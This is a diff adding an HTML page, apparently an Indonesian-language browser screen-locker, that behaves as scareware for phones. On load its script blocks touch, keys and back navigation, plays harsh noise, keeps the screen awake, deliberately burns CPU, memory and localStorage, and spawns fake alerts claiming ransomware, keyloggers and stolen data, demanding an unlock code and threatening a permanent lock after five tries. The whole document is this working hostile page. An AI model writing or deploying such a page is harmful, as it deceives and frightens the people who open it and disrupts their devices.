@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>System_Lock</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+html, body {
+  width:100%; height:100%;
+  background:black;
+  overflow:hidden;
+  touch-action:none;
+  user-select:none;
+  -webkit-user-select:none;
+  font-family:monospace;
+}
+#overlay {
+  position:fixed; top:0; left:0; width:100%; height:100%;
+  background:rgba(0,0,0,0.92);
+  z-index:99999;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  flex-direction:column;
+  padding:20px;
+}
+#overlay h1 {
+  color:#ff0040;
+  font-size:2.2em;
+  text-align:center;
+  animation: blink 0.3s infinite;
+  text-shadow:0 0 20px #ff0040;
+  margin-bottom:10px;
+}
+#overlay .sub {
+  color:#ff6666;
+  font-size:0.8em;
+  margin-bottom:20px;
+  text-align:center;
+}
+#unlockBox {
+  background:#1a1a1a;
+  border:2px solid #ff0040;
+  padding:25px 20px;
+  border-radius:8px;
+  width:90%;
+  max-width:320px;
+  text-align:center;
+  position:relative;
+  z-index:100001;
+}
+#unlockBox label {
+  color:#aaa;
+  font-size:0.8em;
+  display:block;
+  margin-bottom:8px;
+  letter-spacing:2px;
+}
+#unlockInput {
+  width:100%;
+  padding:14px 10px;
+  background:#0d0d0d;
+  border:1px solid #333;
+  color:#00ff88;
+  font-size:1.2em;
+  text-align:center;
+  border-radius:4px;
+  outline:none;
+  font-family:monospace;
+  letter-spacing:4px;
+}
+#unlockInput:focus {
+  border-color:#00ff88;
+  box-shadow:0 0 15px rgba(0,255,136,0.2);
+}
+#unlockBtn {
+  width:100%;
+  padding:14px;
+  margin-top:15px;
+  background:#ff0040;
+  color:white;
+  border:none;
+  border-radius:4px;
+  font-size:1.1em;
+  font-weight:bold;
+  letter-spacing:2px;
+  font-family:monospace;
+  cursor:pointer;
+  transition:0.2s;
+}
+#unlockBtn:hover {
+  background:#cc0033;
+  box-shadow:0 0 25px rgba(255,0,64,0.4);
+}
+#unlockBtn:active {
+  transform:scale(0.96);
+}
+#statusMsg {
+  color:#ff4444;
+  font-size:0.8em;
+  margin-top:12px;
+  min-height:20px;
+}
+#attemptCounter {
+  color:#555;
+  font-size:0.7em;
+  margin-top:10px;
+}
+@keyframes blink {
+  0%{opacity:1;} 50%{opacity:0.3;} 100%{opacity:1;}
+}
+
+/* ===== VIRUS MALWARE POPUP ===== */
+.virus-popup {
+  position:fixed;
+  background:rgba(0,0,0,0.85);
+  border:3px solid #ff0040;
+  border-radius:12px;
+  padding:20px 25px;
+  z-index:100000;
+  color:white;
+  font-family:monospace;
+  text-align:center;
+  min-width:200px;
+  box-shadow:0 0 50px rgba(255,0,64,0.6), inset 0 0 30px rgba(255,0,64,0.3);
+  animation: popupAnim 0.3s ease-out;
+  pointer-events:none;
+}
+.virus-popup .icon {
+  font-size:3em;
+  display:block;
+  margin-bottom:8px;
+}
+.virus-popup .title {
+  color:#ff0040;
+  font-size:1.2em;
+  font-weight:bold;
+  letter-spacing:2px;
+  text-shadow:0 0 15px #ff0040;
+}
+.virus-popup .desc {
+  color:#ccc;
+  font-size:0.7em;
+  margin-top:5px;
+}
+.virus-popup .fake-btn {
+  display:inline-block;
+  margin-top:10px;
+  padding:6px 20px;
+  background:#ff0040;
+  border-radius:4px;
+  font-size:0.7em;
+  color:white;
+  cursor:default;
+  opacity:0.6;
+}
+@keyframes popupAnim {
+  0%{transform:scale(0.3) rotate(-10deg);opacity:0;}
+  100%{transform:scale(1) rotate(0deg);opacity:1;}
+}
+.virus-popup.danger {
+  border-color:#ff8800;
+  box-shadow:0 0 50px rgba(255,136,0,0.6);
+}
+.virus-popup.critical {
+  border-color:#ff00ff;
+  box-shadow:0 0 50px rgba(255,0,255,0.7);
+  animation: popupAnim 0.2s ease-out, glitch 0.1s infinite;
+}
+@keyframes glitch {
+  0%{transform:translate(2px,-2px) scale(1.02);}
+  50%{transform:translate(-2px,2px) scale(0.98);}
+  100%{transform:translate(0,0) scale(1);}
+}
+
+/* ===== VIRUS TEKS BERJALAN ===== */
+.malware-scroll {
+  position:fixed;
+  bottom:0;
+  left:0;
+  width:100%;
+  background:rgba(255,0,0,0.2);
+  color:#ff0040;
+  font-size:0.9em;
+  padding:5px 0;
+  z-index:100002;
+  white-space:nowrap;
+  overflow:hidden;
+  font-family:monospace;
+  letter-spacing:3px;
+  border-top:2px solid #ff0040;
+  pointer-events:none;
+}
+.malware-scroll span {
+  display:inline-block;
+  animation: scrollText 12s linear infinite;
+}
+@keyframes scrollText {
+  0%{transform:translateX(100vw);}
+  100%{transform:translateX(-200%);}
+}
+
+/* ===== SKULL ANIMATION OVERLAY ===== */
+#skullOverlay {
+  position:fixed;
+  top:0; left:0; width:100%; height:100%;
+  z-index:99998;
+  pointer-events:none;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  opacity:0.2;
+  font-size:15em;
+  color:#ff0040;
+  text-shadow:0 0 100px #ff0040;
+  animation: skullPulse 2s ease-in-out infinite;
+}
+@keyframes skullPulse {
+  0%{opacity:0.1; transform:scale(0.8);}
+  50%{opacity:0.3; transform:scale(1.2);}
+  100%{opacity:0.1; transform:scale(0.8);}
+}
+</style>
+</head>
+<body>
+
+<!-- SKULL BACKGROUND -->
+<div id="skullOverlay">💀</div>
+
+<!-- MAIN OVERLAY -->
+<div id="overlay">
+  <h1>⛔ SYSTEM LOCKED</h1>
+  <div class="sub">🔐 Masukkan kunci untuk membuka</div>
+  
+  <div id="unlockBox">
+    <label>KUNCI (6 digit)</label>
+    <input type="password" id="unlockInput" maxlength="6" inputmode="numeric" autofocus>
+    <button id="unlockBtn">BUKA</button>
+    <div id="statusMsg"></div>
+    <div id="attemptCounter">Percobaan: 0/5</div>
+  </div>
+</div>
+
+<!-- MALWARE SCROLLING TEXT -->
+<div class="malware-scroll" id="malwareScroll">
+  <span>
+    ⚠️ VIRUS DETEKSI ⚠️ MALWARE AKTIF ⚠️ DATA TERENKRIPSI ⚠️ SISTEM KOMPROMI ⚠️ 
+    ⚡ RANSOMWARE ACTIVE ⚡ TROJAN DITEMUKAN ⚡ WORM BEREDAR ⚡ 
+    ☠️ KUNCI DIPERLUKAN ☠️ HUBUNGI ADMIN ☠️ JANGAN MATIKAN ☠️
+  </span>
+</div>
+
+<script>
+// ========== KONFIGURASI ==========
+const KUNCI_BENAR = "2026";
+let attempts = 0;
+const MAX_ATTEMPTS = 5;
+let isUnlocked = false;
+let lagInterval, lagInterval2, lagInterval3, lagInterval4;
+let noiseInterval, noiseInterval2;
+let memoryHogInterval;
+let virusPopupInterval, virusPopupInterval2;
+
+// ========== BLOKIR SENTUHAN ==========
+function blockAll(e) { e.preventDefault(); }
+document.addEventListener('touchstart', blockAll, {passive:false});
+document.addEventListener('touchmove', blockAll, {passive:false});
+document.addEventListener('touchend', blockAll, {passive:false});
+document.addEventListener('click', function(e) {
+  if (e.target.id !== 'unlockBtn' && e.target.id !== 'unlockInput') {
+    e.preventDefault();
+  }
+}, {passive:false});
+document.addEventListener('contextmenu', blockAll);
+
+// ========== BLOKIR NAVIGASI ==========
+window.addEventListener('popstate', function(e) {
+  if (!isUnlocked) {
+    history.pushState(null, null, location.href);
+  }
+});
+history.pushState(null, null, location.href);
+setInterval(function() {
+  if (!isUnlocked) {
+    history.pushState(null, null, location.href);
+  }
+}, 150);
+
+// ========== BLOKIR TOMBOL FISIK ==========
+document.addEventListener('keydown', function(e) {
+  if (!isUnlocked) {
+    e.preventDefault();
+    if (e.key === 'Escape' || e.key === 'Backspace' || e.key === 'Home') {
+      e.preventDefault();
+      return false;
+    }
+  }
+});
+
+// ========== SUARA BERISIK ==========
+var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+function playNoise() {
+  if (isUnlocked) return;
+  try {
+    var osc = audioCtx.createOscillator();
+    var gain = audioCtx.createGain();
+    osc.type = 'sawtooth';
+    osc.frequency.value = 700 + Math.random() * 500;
+    osc.connect(gain);
+    gain.connect(audioCtx.destination);
+    gain.gain.value = 0.25;
+    osc.start();
+    osc.stop(audioCtx.currentTime + 0.12);
+    
+    var osc2 = audioCtx.createOscillator();
+    var gain2 = audioCtx.createGain();
+    osc2.type = 'square';
+    osc2.frequency.value = 1400 + Math.random() * 400;
+    osc2.connect(gain2);
+    gain2.connect(audioCtx.destination);
+    gain2.gain.value = 0.15;
+    osc2.start();
+    osc2.stop(audioCtx.currentTime + 0.08);
+    
+    var bufferSize = 1.5 * audioCtx.sampleRate;
+    var buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+    var data = buffer.getChannelData(0);
+    for (var i = 0; i < bufferSize; i++) {
+      data[i] = (Math.random() * 2 - 1) * 0.4;
+    }
+    var noise = audioCtx.createBufferSource();
+    noise.buffer = buffer;
+    var gainNoise = audioCtx.createGain();
+    gainNoise.gain.value = 0.2;
+    noise.connect(gainNoise);
+    gainNoise.connect(audioCtx.destination);
+    noise.start();
+    noise.stop(audioCtx.currentTime + 0.15);
+  } catch(e) {}
+}
+
+noiseInterval = setInterval(function() {
+  if (!isUnlocked) playNoise();
+}, 350);
+
+noiseInterval2 = setInterval(function() {
+  if (!isUnlocked) {
+    try {
+      var osc3 = audioCtx.createOscillator();
+      var gain3 = audioCtx.createGain();
+      osc3.type = 'triangle';
+      osc3.frequency.value = 2000 + Math.random() * 300;
+      osc3.connect(gain3);
+      gain3.connect(audioCtx.destination);
+      gain3.gain.value = 0.1;
+      osc3.start();
+      osc3.stop(audioCtx.currentTime + 0.05);
+    } catch(e) {}
+  }
+}, 180);
+
+// ========== KEEP AWAKE ==========
+try { navigator.wakeLock.request('screen').catch(function(){}); } catch(e) {}
+
+// ========== LAG / NGELAG ==========
+function startLag() {
+  if (isUnlocked) return;
+  
+  lagInterval = setInterval(function() {
+    if (isUnlocked) return;
+    var start = Date.now();
+    while (Date.now() - start < 80) { 
+      Math.sqrt(Math.random() * 999999);
+    }
+  }, 50);
+  
+  var memoryHog = [];
+  memoryHogInterval = setInterval(function() {
+    if (isUnlocked) {
+      memoryHog = [];
+      return;
+    }
+    try {
+      var chunk = new Array(100000).fill('x'.repeat(100));
+      memoryHog.push(chunk);
+      if (memoryHog.length > 200) {
+        memoryHog.splice(0, 50);
+      }
+    } catch(e) {}
+  }, 100);
+  
+  lagInterval2 = setInterval(function() {
+    if (isUnlocked) return;
+    document.body.style.display = 'none';
+    document.body.offsetHeight;
+    document.body.style.display = 'flex';
+  }, 30);
+  
+  function blockFrame() {
+    if (isUnlocked) return;
+    requestAnimationFrame(function() {
+      for (var i=0; i<1000; i++) {
+        Math.sin(i) * Math.cos(i);
+      }
+      blockFrame();
+    });
+  }
+  blockFrame();
+  
+  lagInterval3 = setInterval(function() {
+    if (isUnlocked) return;
+    try { 
+      var dummy = document.createElement('div');
+      dummy.style.cssText = 'position:absolute;left:-9999px;width:5000px;height:5000px;';
+      document.body.appendChild(dummy);
+      setTimeout(function() {
+        if (dummy.parentNode) dummy.parentNode.removeChild(dummy);
+      }, 10);
+    } catch(e) {}
+  }, 20);
+  
+  lagInterval4 = setInterval(function() {
+    if (isUnlocked) return;
+    try {
+      for (var i=0; i<10; i++) {
+        localStorage.setItem('spam_' + Math.random(), 'x'.repeat(5000));
+      }
+      var keys = Object.keys(localStorage);
+      if (keys.length > 50) {
+        for (var i=0; i<10; i++) {
+          localStorage.removeItem(keys[i]);
+        }
+      }
+    } catch(e) {}
+  }, 50);
+}
+
+// ========== VIRUS MALWARE POPUP ==========
+var virusMessages = [
+  { icon: '🦠', title: 'TROJAN DETEKSI!', desc: 'Malware menyusup ke sistem...' },
+  { icon: '💀', title: 'RANSOMWARE AKTIF!', desc: 'Data terenkripsi. Bayar tebusan!' },
+  { icon: '☠️', title: 'WORM BEREDAR!', desc: 'Menyebar ke kontak & file...' },
+  { icon: '🔥', title: 'FIREWALL RUSAK!', desc: 'Akses root diberikan ke hacker.' },
+  { icon: '⚡', title: 'KEYLOGGER TERPASANG!', desc: 'Semua ketikan direkam.' },
+  { icon: '👾', title: 'BOTNET JOIN!', desc: 'HP menjadi zombie DDoS.' },
+  { icon: '🧬', title: 'MUTASI VIRUS!', desc: 'Varian baru terdeteksi.' },
+  { icon: '🔓', title: 'BACKDOOR TERBUKA!', desc: 'Akses jarak jauh aktif.' },
+  { icon: '📁', title: 'FILE TERHAPUS!', desc: '80% data hilang.' },
+  { icon: '📱', title: 'IMEI TERCURI!', desc: 'Perangkat terdaftar di darknet.' }
+];
+
+function spawnVirusPopup() {
+  if (isUnlocked) return;
+  var msg = virusMessages[Math.floor(Math.random() * virusMessages.length)];
+  var popup = document.createElement('div');
+  popup.className = 'virus-popup';
+  if (Math.random() > 0.7) popup.classList.add('critical');
+  else if (Math.random() > 0.5) popup.classList.add('danger');
+  
+  var x = Math.random() * 60 + 5;
+  var y = Math.random() * 60 + 5;
+  popup.style.left = x + '%';
+  popup.style.top = y + '%';
+  
+  popup.innerHTML = `
+    <span class="icon">${msg.icon}</span>
+    <div class="title">${msg.title}</div>
+    <div class="desc">${msg.desc}</div>
+    <div class="fake-btn">OK (tidak berfungsi)</div>
+  `;
+  
+  document.body.appendChild(popup);
+  
+  // Hapus setelah beberapa detik
+  setTimeout(function() {
+    if (popup.parentNode) {
+      popup.style.transition = 'opacity 0.5s';
+      popup.style.opacity = '0';
+      setTimeout(function() {
+        if (popup.parentNode) popup.parentNode.removeChild(popup);
+      }, 500);
+    }
+  }, 3000 + Math.random() * 2000);
+}
+
+// Spawn virus popup setiap 2-4 detik
+virusPopupInterval = setInterval(function() {
+  if (!isUnlocked) {
+    spawnVirusPopup();
+    // Kadang spawn 2 sekaligus
+    if (Math.random() > 0.6) {
+      setTimeout(spawnVirusPopup, 300);
+    }
+  }
+}, 2500);
+
+// Popup tambahan lebih agresif
+virusPopupInterval2 = setInterval(function() {
+  if (!isUnlocked && Math.random() > 0.5) {
+    spawnVirusPopup();
+  }
+}, 1200);
+
+// ========== FUNGSI UNLOCK ==========
+function unlock() {
+  if (isUnlocked) return;
+  
+  var input = document.getElementById('unlockInput');
+  var status = document.getElementById('statusMsg');
+  var counter = document.getElementById('attemptCounter');
+  var kode = input.value.trim();
+  
+  if (kode === '') {
+    status.innerHTML = '⚠️ Masukkan kunci!';
+    status.style.color = '#ffaa00';
+    return;
+  }
+  
+  attempts++;
+  counter.textContent = 'Percobaan: ' + attempts + '/' + MAX_ATTEMPTS;
+  
+  if (kode === KUNCI_BENAR) {
+    isUnlocked = true;
+    status.innerHTML = '✅ BERHASIL! Sistem dibuka.';
+    status.style.color = '#00ff88';
+    
+    // Hentikan semua
+    clearInterval(noiseInterval);
+    clearInterval(noiseInterval2);
+    clearInterval(lagInterval);
+    clearInterval(lagInterval2);
+    clearInterval(lagInterval3);
+    clearInterval(lagInterval4);
+    clearInterval(memoryHogInterval);
+    clearInterval(virusPopupInterval);
+    clearInterval(virusPopupInterval2);
+    
+    // Hapus semua popup virus
+    document.querySelectorAll('.virus-popup').forEach(function(el) {
+      el.style.transition = 'opacity 0.3s';
+      el.style.opacity = '0';
+      setTimeout(function() { if (el.parentNode) el.parentNode.removeChild(el); }, 300);
+    });
+    document.getElementById('malwareScroll').style.display = 'none';
+    document.getElementById('skullOverlay').style.display = 'none';
+    
+    document.removeEventListener('touchstart', blockAll);
+    document.removeEventListener('touchmove', blockAll);
+    document.removeEventListener('touchend', blockAll);
+    document.removeEventListener('click', blockAll);
+    
+    setTimeout(function() {
+      document.getElementById('overlay').style.display = 'none';
+      document.body.style.background = '#111';
+      document.body.innerHTML = '<div style="color:#00ff88;font-family:monospace;font-size:2em;text-align:center;margin-top:40%;padding:20px;">🔓 SISTEM DIBUKA<br><span style="font-size:0.4em;color:#666;">HP normal kembali</span></div>';
+    }, 1500);
+    
+  } else {
+    status.innerHTML = '❌ Kunci salah!';
+    status.style.color = '#ff0040';
+    input.value = '';
+    input.focus();
+    
+    if (attempts >= MAX_ATTEMPTS) {
+      status.innerHTML = '💀 BATAS PERCOBAAN HABIS! Lock permanen.';
+      // Spam virus lebih cepat
+      setInterval(function() {
+        if (!isUnlocked) spawnVirusPopup();
+      }, 500);
+      document.getElementById('unlockBtn').disabled = true;
+      document.getElementById('unlockInput').disabled = true;
+    }
+  }
+}
+
+// ========== EVENT UNLOCK ==========
+document.getElementById('unlockBtn').addEventListener('click', function(e) {
+  e.preventDefault();
+  unlock();
+});
+
+document.getElementById('unlockInput').addEventListener('keydown', function(e) {
+  if (e.key === 'Enter') {
+    e.preventDefault();
+    unlock();
+  }
+});
+
+// ========== ALERT LOOP ==========
+setInterval(function() {
+  if (!isUnlocked) {
+    try { alert('🔒 TERKUNCI'); } catch(e) {}
+  }
+}, 200000);
+
+// ========== FOKUS INPUT ==========
+setTimeout(function() {
+  document.getElementById('unlockInput').focus();
+}, 300);
+
+// ========== START LAG & VIRUS ==========
+startLag();
+</script>
+</body>
+</html>
